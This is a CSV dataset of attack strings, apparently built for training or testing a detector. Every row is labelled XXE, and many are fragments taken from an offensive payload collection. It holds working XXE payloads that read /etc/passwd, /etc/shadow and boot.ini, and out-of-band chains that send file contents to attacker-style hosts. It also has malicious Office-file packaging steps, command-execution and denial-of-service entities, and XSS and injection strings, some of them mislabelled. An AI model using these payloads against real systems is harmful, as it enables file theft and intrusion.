payload,label,source
"xsi:schemaLocation=""http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0"">",xxe,payloads_all_the_things
"<feature name=""deployer"" version=""2.0"" install=""auto"">",xxe,payloads_all_the_things
</feature>,xxe,payloads_all_the_things
</features>,xxe,payloads_all_the_things
Content-Type: text/xml; charset=utf-8,xxe,payloads_all_the_things
HTTP Content Type: `Content-Type: text/xml; charset=utf-8`,xxe,payloads_all_the_things
Reading Byte Order Mark (BOM),xxe,payloads_all_the_things
UTF-8 (3C 3F 78 6D),xxe,payloads_all_the_things
UTF-16BE (00 3C 00 3F),xxe,payloads_all_the_things
UTF-16LE (3C 00 3F 00),xxe,payloads_all_the_things
"XML declaration: `<?xml version=""1.0"" encoding=""UTF-8""?>`",xxe,payloads_all_the_things
cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml,xxe,payloads_all_the_things
application/json,xxe,payloads_all_the_things
"{""search"":""name"",""value"":""test""}",xxe,payloads_all_the_things
application/xml,xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""UTF-8"" ?><root><search>name</search><value>data</value></root>",xxe,payloads_all_the_things
<root>,xxe,payloads_all_the_things
XML documents must contain one root (`<root>`) element that is the parent of all other elements.,xxe,payloads_all_the_things
"""errors"":{",xxe,payloads_all_the_things
"""errorMessage"":""org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.""",xxe,payloads_all_the_things
"<svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" width=""300"" version=""1.1"" height=""200"">",xxe,payloads_all_the_things
"<image xlink:href=""expect://ls"" width=""200"" height=""200""></image>",xxe,payloads_all_the_things
"<?xml version=""1.0"" standalone=""yes""?>",xxe,payloads_all_the_things
"<!DOCTYPE test [ <!ENTITY xxe SYSTEM ""file:///etc/hostname"" > ]>",xxe,payloads_all_the_things
"<svg width=""128px"" height=""128px"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" version=""1.1"">",xxe,payloads_all_the_things
"<text font-size=""16"" x=""0"" y=""16"">&xxe;</text>",xxe,payloads_all_the_things
<!DOCTYPE svg [,xxe,payloads_all_the_things
<!ELEMENT svg ANY >,xxe,payloads_all_the_things
"<!ENTITY % sp SYSTEM ""http://10.10.10.10:8080/xxe.xml"">",xxe,payloads_all_the_things
"<svg viewBox=""0 0 200 200"" version=""1.2"" xmlns=""http://www.w3.org/2000/svg"" style=""fill:red"">",xxe,payloads_all_the_things
"<text x=""15"" y=""100"" style=""fill:black"">XXE via SVG rasterization</text>",xxe,payloads_all_the_things
"<rect x=""0"" y=""0"" rx=""10"" ry=""10"" width=""200"" height=""200"" style=""fill:pink;opacity:0.7""/>",xxe,payloads_all_the_things
"<flowRoot font-size=""15"">",xxe,payloads_all_the_things
<flowRegion>,xxe,payloads_all_the_things
"<rect x=""0"" y=""0"" width=""200"" height=""200"" style=""fill:red;opacity:0.3""/>",xxe,payloads_all_the_things
</flowRegion>,xxe,payloads_all_the_things
<flowDiv>,xxe,payloads_all_the_things
<flowPara>&exfil;</flowPara>,xxe,payloads_all_the_things
</flowDiv>,xxe,payloads_all_the_things
</flowRoot>,xxe,payloads_all_the_things
"<!ENTITY % data SYSTEM ""php://filter/convert.base64-encode/resource=/etc/hostname"">",xxe,payloads_all_the_things
"<!ENTITY % param1 ""<!ENTITY exfil SYSTEM 'ftp://10.10.10.10:2121/%data;'>"">",xxe,payloads_all_the_things
<soap:Body>,xxe,payloads_all_the_things
<foo>,xxe,payloads_all_the_things
"<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM ""http://10.10.10.10:22/""> %dtd;]><xxx/>]]>",xxe,payloads_all_the_things
</foo>,xxe,payloads_all_the_things
</soap:Body>,xxe,payloads_all_the_things
/_rels/.rels,xxe,payloads_all_the_things
[Content_Types].xml,xxe,payloads_all_the_things
/word/document.xml,xxe,payloads_all_the_things
/ppt/presentation.xml,xxe,payloads_all_the_things
/xl/workbook.xml,xxe,payloads_all_the_things
zip -u xxe.docx [Content_Types].xml,xxe,payloads_all_the_things
DOCX/XLSX/PPTX,xxe,payloads_all_the_things
ODT/ODG/ODP/ODS,xxe,payloads_all_the_things
SVG,xxe,payloads_all_the_things
XML,xxe,payloads_all_the_things
PDF (experimental),xxe,payloads_all_the_things
JPG (experimental),xxe,payloads_all_the_things
GIF (experimental),xxe,payloads_all_the_things
$ 7z l xxe.xlsx,xxe,payloads_all_the_things
[...],xxe,payloads_all_the_things
Date      Time    Attr         Size   Compressed  Name,xxe,payloads_all_the_things
------------------- ----- ------------ ------------  ------------------------,xxe,payloads_all_the_things
2021-10-17 15:19:00 .....          578          223  _rels/.rels,xxe,payloads_all_the_things
2021-10-17 15:19:00 .....          887          508  xl/workbook.xml,xxe,payloads_all_the_things
2021-10-17 15:19:00 .....         4451          643  xl/styles.xml,xxe,payloads_all_the_things
2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml,xxe,payloads_all_the_things
2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels,xxe,payloads_all_the_things
2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml,xxe,payloads_all_the_things
2021-10-17 15:19:00 .....          731          352  docProps/core.xml,xxe,payloads_all_the_things
2021-10-17 15:19:00 .....          410          246  docProps/app.xml,xxe,payloads_all_the_things
2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml,xxe,payloads_all_the_things
2021-10-17 15:19:00              11216         3586  9 files,xxe,payloads_all_the_things
cd XXE,xxe,payloads_all_the_things
zip -r -u ../xxe.xlsx *,xxe,payloads_all_the_things
Microsoft Excel 2007+,xxe,payloads_all_the_things
xl/workbook.xml,xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>",xxe,payloads_all_the_things
"<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM ""http://10.10.10.10:8000/xxe.dtd"">%asd;%c;]>",xxe,payloads_all_the_things
<cdl>&rrr;</cdl>,xxe,payloads_all_the_things
"<workbook xmlns=""http://schemas.openxmlformats.org/spreadsheetml/2006/main"" xmlns:r=""http://schemas.openxmlformats.org/officeDocument/2006/relationships"">",xxe,payloads_all_the_things
xl/sharedStrings.xml,xxe,payloads_all_the_things
"<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM ""http://10.10.10.10:8000/xxe.dtd"">%asd;%c;]>",xxe,payloads_all_the_things
"<sst xmlns=""http://schemas.openxmlformats.org/spreadsheetml/2006/main"" count=""10"" uniqueCount=""10""><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>",xxe,payloads_all_the_things
"<!ENTITY % d SYSTEM ""file:///etc/passwd"">",xxe,payloads_all_the_things
"<!ENTITY % c ""<!ENTITY rrr SYSTEM 'ftp://10.10.10.10:2121/%d;'>"">",xxe,payloads_all_the_things
xxeserv -o files.log -p 2121 -w -wd public -wp 8000,xxe,payloads_all_the_things
<!-- Load the contents of a sensitive file into a variable -->,xxe,payloads_all_the_things
"<!ENTITY % payload SYSTEM ""file:///etc/passwd"">",xxe,payloads_all_the_things
<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->,xxe,payloads_all_the_things
"<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM ""http://[ATTACKER.DOMAIN.TLD]/x=%payload;"">'>",xxe,payloads_all_the_things
%external;,xxe,payloads_all_the_things
_Processing),xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [ <!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>",xxe,payloads_all_the_things
"<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM ""file:///etc/passwd""> ]>",xxe,payloads_all_the_things
"<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM ""file:///c:/boot.ini""> ]>",xxe,payloads_all_the_things
"<!DOCTYPE foo [<!ENTITY xxe46471 SYSTEM ""http://crowdshield.com/.testing/rfi_vuln.txt""> ]>",xxe,payloads_all_the_things
"<?xml version=""1.0""?><methodCall><methodName>demo.sayHello</methodName><params></params></methodCall>",xxe,payloads_all_the_things
"<?xml version=""1.0""?><change-log><text>Hello World</text></change-log>",xxe,payloads_all_the_things
"<?xml version=""1.0""?><change-log><text>&quot;Hello World&quot;</text></change-log>",xxe,payloads_all_the_things
"<?xml version=""1.0""?><!DOCTYPE change-log[ <!ENTITY myEntity ""World""> ]><change-log><text>Hello &myEntity;</text></change-log>",xxe,payloads_all_the_things
"<?xml version=""1.0""?><!DOCTYPE change-log[ <!ENTITY myEntity ""World""><!ENTITY myQuote ""&quot;""> ]><change-log><text>&myQuote;Hello &myEntity;&myQuote;</text></change-log>",xxe,payloads_all_the_things
"<!ENTITY systemEntity SYSTEM ""robots.txt"">",xxe,payloads_all_the_things
<change-log> <text>&systemEntity;</text> </change-log>,xxe,payloads_all_the_things
"<?xml version=""1.0""?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM ""robots.txt""> ]> <change-log> <text>&systemEntity;</text> </change-log>",xxe,payloads_all_the_things
"<?xml version=""1.0""?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM ""../../../../boot.ini""> ]> <change-log> <text>&systemEntity;</text> </change-log>",xxe,payloads_all_the_things
"<?xml version=""1.0""?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM ""robots.txt""> ]> <change-log> <text>&systemEntity;</text>; </change-log>",xxe,payloads_all_the_things
<test> $lDOMDocument->textContent=<![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]> </test>,xxe,payloads_all_the_things
"<?xml version=""1.0""?><change-log><text><script>alert(1)</script></text></change-log>",xxe,payloads_all_the_things
count(/child::node()),xxe,payloads_all_the_things
x' or name()='username' or 'x'='y,xxe,payloads_all_the_things
"<name>','')); phpinfo(); exit;/*</name>",xxe,payloads_all_the_things
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>,xxe,payloads_all_the_things
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>,xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/passwd"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/shadow"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""https://crowdshield.com/.testing/rfi_vuln.txt"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""http://xerosecurity.com/.testing/rfi_vuln.txt"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>""",xxe,payloads_all_the_things
"<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>""",xxe,payloads_all_the_things
"<xml SRC=""https://crowdshield.com/.testing/rfi_vuln.txt"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>""",xxe,payloads_all_the_things
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""https://crowdshield.com/.testing/xss.html""><xss:xss>XSS</xss:xss></HTML>",xxe,payloads_all_the_things
"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>",xxe,payloads_all_the_things
"<xml ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:alert('XSS')""&gt;</B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",xxe,payloads_all_the_things
"<xml SRC=""https://crowdshield.com/.testing/xss.html"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",xxe,payloads_all_the_things
"<?xml version='1.0' standalone='no'?><!DOCTYPE foo [<!ENTITY % f5a30 SYSTEM ""https://crowdshield.com/.testing/rfi_vuln.txt"">%f5a30; ]>",xxe,payloads_all_the_things
"<?xml version=""1.0""?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM ""../../../boot.ini"" ]> <change-log> <text>&systemEntity;</text>; </change-log>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""utf-8""?><!DOCTYPE doc [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM ""php://filter/read-convert.base64-encode/resource=file:///C:/boot.ini"" >]><doc><test>Contents of file: &xxe;</test></doc>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE foo [     <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM ""file:///etc/shadow"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE foo [     <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM ""file:///c:/boot.ini"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM ""https://crowdshield.com/.testing/rfi.txt"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"""}}</script><script>alert(1);</script></body></html><!--",xxe,payloads_all_the_things
"}}</script>'""",xxe,payloads_all_the_things
}}</script>',xxe,payloads_all_the_things
'}}</script>',xxe,payloads_all_the_things
"'}}</script>""",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""utf-16"" standalone=""yes""?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://wordpress.org/</string></value></param><param><value><string>http://xerosecurity.com</string></value></param></params></methodCall>",xxe,payloads_all_the_things
"<xml version=""1.0""?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM ""../../../../../../../etc/passwd"">]><methodCall><methodName>&xxe</methodName></methodCall>",xxe,payloads_all_the_things
"<xml version=""1.0""?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM ""http://xerosecurity.com/.testing/rfi_vuln.txt"">]><methodCall><methodName>&xxe</methodName></methodCall>",xxe,payloads_all_the_things
"<xml version=""1.0""?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM ""https://crowdshield.com/.testing/rfi_vuln.txt"">]><methodCall><methodName>&xxe</methodName></methodCall>",xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
